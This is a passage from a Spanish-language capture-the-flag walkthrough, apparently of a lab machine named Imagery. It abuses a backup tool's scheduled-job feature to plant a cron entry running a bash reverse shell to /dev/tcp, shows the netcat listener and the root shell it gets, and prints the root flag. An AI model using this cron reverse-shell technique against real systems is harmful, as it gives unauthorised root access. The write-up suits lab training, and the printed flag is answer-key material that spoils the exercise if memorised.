Global Flags (apply to all commands unless overridden):
  --app-password <password>    : Provide the Charcol *application password* directly. Required for 'auto' commands if status 1. Less secure than interactive prompt.
  -p, "--password" <password>    : Provide the *file encryption/decryption password* directly. Overrides application password for file operations. Less secure than --ask-password.
  -v, "--verbose"                : Enable verbose output.
  --quiet                      : Suppress informational output (show only warnings and errors).
  --log-file <path>            : Log all output to a specified file.
  --dry-run                    : Simulate actions without actual file changes (for 'backup' and 'fetch').
  --ask-password               : Prompt for the *file encryption/decryption password* securely. Overrides -p and application password for file operations.
  --no-banner                   : Do not display the ASCII banner.
  -R, "--reset-password-to-default"  : Reset application password to default (requires system password verification).
                
charcol>
```

Vemos que podemos crear un `crontab`, por lo que vamos aprovechar eso para hacer esto, pero antes de darle a enviar vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si lo ejecutamos...

```shell
auto add --schedule "* * * * *" --command "bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" --name "testShell"
```

Info:

```
[2025-10-04 08:22:50] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-10-04 08:22:55] [INFO] System password verified successfully.
[2025-10-04 08:22:55] [INFO] Auto job 'testShell' (ID: a21245a5-042e-44ab-8596-9f10228e52ce) added successfully. The job will run according to schedule.
[2025-10-04 08:22:55] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true bash -c 'bash -i >& /dev/tcp/10.10.14.64/7755 0>&1'
```

Volvemos a donde tenemos la escucha y veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.11.88] 40014
bash: cannot set terminal process group (78587): Inappropriate ioctl for device
bash: no job control in this shell
root@Imagery:~# whoami
whoami
root
```

Vemos que ha funcionado y con esto seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
cf582205bdd0016edde2d7f399f81674
```
